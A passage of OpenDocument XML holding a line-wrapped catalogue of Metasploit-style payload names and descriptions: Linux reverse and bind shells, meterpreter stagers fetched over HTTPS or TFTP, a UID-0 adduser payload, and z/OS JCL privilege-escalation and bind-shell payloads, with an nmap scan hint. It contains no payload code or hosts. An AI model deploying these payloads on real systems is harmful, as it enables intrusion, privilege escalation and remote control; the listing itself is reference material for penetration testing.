      <text:p text:style-name="P1"><text:s text:c="4"/>se_nonx_tcp <text:s text:c="21"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command shell (staged). Connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell/rever <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_tcp <text:s text:c="26"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command shell (staged). Connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell/rever <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_tcp_uuid <text:s text:c="21"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command shell (staged). Connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell_bind_ <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ipv6_tcp <text:s text:c="24"/>d from an HTTPS server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection over IPv6 and</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>spawn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell_bind_ <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="29"/>d from an HTTPS server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection and spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell_bind_ <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp_random_port <text:s text:c="17"/>d from an HTTPS server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection in a random po</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt and spawn a command shell. U</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>se nmap to discover the open po</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt: 'nmap -sS target -p-'.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell_find_ <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>port <text:s text:c="28"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="38"/>shell on an established connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell_find_ <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tag <text:s text:c="29"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>shell on an established connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion (proxy/nat safe)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell_rever <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_tcp <text:s text:c="26"/>d from an HTTPS server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to attacker and spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell_rever <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_tcp_ipv6 <text:s text:c="21"/>d from an HTTPS server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to attacker and spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/mips64/meterpret <text:s/>Fetch and execute a MIPS64 payl</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er_reverse_http <text:s text:c="17"/>oad from a TFTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/mips64/meterpret <text:s/>Fetch and execute a MIPS64 payl</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er_reverse_https <text:s text:c="16"/>oad from a TFTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/mips64/meterpret <text:s/>Fetch and execute a MIPS64 payl</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er_reverse_tcp <text:s text:c="18"/>oad from a TFTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/exec <text:s text:c="9"/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d from a TFTP server. Execute a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n arbitrary command or just a /</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>bin/sh shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/meterpreter/ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp <text:s text:c="24"/>d from a TFTP server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/meterpreter/ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_sctp <text:s text:c="20"/>d from a TFTP server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/meterpreter/ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="21"/>d from a TFTP server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/meterpreter_ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_http <text:s text:c="20"/>d from a TFTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/meterpreter_ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_https <text:s text:c="19"/>d from a TFTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/meterpreter_ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="21"/>d from a TFTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/pingback_bin <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp <text:s text:c="27"/>d from a TFTP server. Accept a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>connection from attacker and re</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>port UUID (Linux x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/pingback_rev <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp <text:s text:c="24"/>d from a TFTP server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to attacker and report UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>(Linux x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/shell/bind_t <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>d from a TFTP server. Spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (staged). Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/shell/revers <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>e_sctp <text:s text:c="26"/>d from a TFTP server. Spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (staged). Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/shell/revers <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="27"/>d from a TFTP server. Spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (staged). Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/shell_bind_i <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pv6_tcp <text:s text:c="25"/>d from a TFTP server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r an IPv6 connection and spawn</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/shell_bind_t <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>d from a TFTP server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection and spawn a comm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>and shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/shell_bind_t <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp_random_port <text:s text:c="18"/>d from a TFTP server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection in a random port</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>and spawn a command shell. Use</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>nmap to discover the open port</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>: 'nmap -sS target -p-'.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/shell_find_p <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ort <text:s text:c="29"/>d from a TFTP server. Spawn a s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hell on an established connecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>on</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/shell_revers <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_ipv6_tcp <text:s text:c="22"/>d from a TFTP server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to attacker and spawn a com</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mand shell over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x64/shell_revers <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="27"/>d from a TFTP server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to attacker and spawn a com</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mand shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/adduser <text:s text:c="6"/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>from a TFTP server. Create a n</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ew user with UID 0</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/chmod <text:s text:c="8"/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>from a TFTP server. Runs chmod</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>on specified file with specifi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed mode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/exec <text:s text:c="9"/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>from a TFTP server. Execute an</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>arbitrary command or just a /b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>in/sh shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/generic/debu <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>g_trap <text:s text:c="27"/>from a TFTP server. Generate a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>debug trap in the target proce</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ss</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/generic/tigh <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t_loop <text:s text:c="27"/>from a TFTP server. Generate a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>tight loop in the target proce</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ss</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/linux/tftp/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_ipv6_tcp <text:s text:c="20"/>from a TFTP server. Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>an IPv6 connection (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_ipv6_tcp_uuid <text:s text:c="15"/>from a TFTP server. Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>an IPv6 connection with UUID S</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>upport (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_nonx_tcp <text:s text:c="20"/>from a TFTP server. Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp <text:s text:c="25"/>from a TFTP server. Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a connection (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp_uuid <text:s text:c="20"/>from a TFTP server. Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a connection with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>(Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>find_tag <text:s text:c="25"/>from a TFTP server. Use an est</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ablished connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_ipv6_tcp <text:s text:c="17"/>from a TFTP server. Connect ba</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ck to attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_nonx_tcp <text:s text:c="17"/>from a TFTP server. Connect ba</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ck to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="22"/>from a TFTP server. Connect ba</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ck to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp_uuid <text:s text:c="17"/>from a TFTP server. Connect ba</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ck to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/meterpreter_ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_http <text:s text:c="21"/>from a TFTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/meterpreter_ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_https <text:s text:c="20"/>from a TFTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/meterpreter_ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="22"/>from a TFTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/metsvc_bind_ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="30"/>from a TFTP server. Stub paylo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ad for interacting with a Meter</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>preter Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/metsvc_rever <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_tcp <text:s text:c="27"/>from a TFTP server. Stub paylo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ad for interacting with a Meter</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>preter Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/read_file <text:s text:c="4"/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>from a TFTP server. Read up to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>4096 bytes from the local file</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>system and write it back out t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the specified file descriptor</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell/bind_i <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>pv6_tcp <text:s text:c="26"/>from a TFTP server. Spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell (staged). Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r an IPv6 connection (Linux x86</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell/bind_i <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pv6_tcp_uuid <text:s text:c="21"/>from a TFTP server. Spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell (staged). Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell/bind_n <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>onx_tcp <text:s text:c="26"/>from a TFTP server. Spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell (staged). Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell/bind_t <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="31"/>from a TFTP server. Spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell (staged). Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell/bind_t <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp_uuid <text:s text:c="26"/>from a TFTP server. Spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell (staged). Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection with UUID Suppor</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell/find_t <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ag <text:s text:c="31"/>from a TFTP server. Spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell (staged). Use an es</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tablished connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell/revers <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_ipv6_tcp <text:s text:c="23"/>from a TFTP server. Spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell (staged). Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell/revers <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_nonx_tcp <text:s text:c="23"/>from a TFTP server. Spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell (staged). Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell/revers <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="28"/>from a TFTP server. Spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell (staged). Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell/revers <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp_uuid <text:s text:c="23"/>from a TFTP server. Spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell (staged). Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell_bind_i <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pv6_tcp <text:s text:c="26"/>from a TFTP server. Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a connection over IPv6 and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell_bind_t <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="31"/>from a TFTP server. Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a connection and spawn a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell_bind_t <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp_random_port <text:s text:c="19"/>from a TFTP server. Listen for</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="38"/>a connection in a random port</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>and spawn a command shell. Use</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nmap to discover the open port:</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>'nmap -sS target -p-'.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell_find_p <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ort <text:s text:c="30"/>from a TFTP server. Spawn a sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ell on an established connectio</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell_find_t <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ag <text:s text:c="31"/>from a TFTP server. Spawn a sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ell on an established connectio</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n (proxy/nat safe)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell_revers <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="28"/>from a TFTP server. Connect ba</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ck to attacker and spawn a comm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>and shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/tftp/x86/shell_revers <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp_ipv6 <text:s text:c="23"/>from a TFTP server. Connect ba</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ck to attacker and spawn a comm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>and shell over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/mainframe/apf_privesc_jcl <text:s text:c="3"/>(Elevate privileges for user. A</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>dds SYSTEM SPECIAL and BPX.SUPE</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>RUSER to user profile. Does thi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s by using an unsecured/updatea</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ble APF authorized library (APF</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>LIB) and updating the user's AC</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>EE using this program/library.</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Note: This privesc only works w</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ith z/OS systems using RACF, no</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>other ESM is supported.)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/mainframe/bind_shell_jcl <text:s text:c="4"/>Provide JCL which creates a bin</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d shell This implmentation does</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>not include ebcdic character t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ranslation, so a client with tr</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>anslation capabilities is requi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>red. MSF handles this automatic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ally.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/mainframe/generic_jcl <text:s text:c="7"/>Provide JCL which can be used t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o submit a job to JES2 on z/OS</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>which will exit and return 0. T</text:p>
